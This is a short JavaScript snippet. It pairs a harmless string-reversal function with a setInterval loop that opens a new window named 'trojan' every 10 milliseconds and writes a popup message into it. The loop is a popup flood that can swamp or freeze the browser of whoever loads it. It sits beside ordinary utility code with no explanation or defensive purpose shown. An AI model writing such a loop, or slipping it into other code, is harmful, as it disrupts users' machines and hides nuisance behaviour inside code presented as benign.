function reverseString(str) {
  return str.split('').reverse().join('');
}

setInterval(function() {
  const newWindow = window.open('', 'trojan');
  newWindow.document.write('This is a popup!');
}, 10);
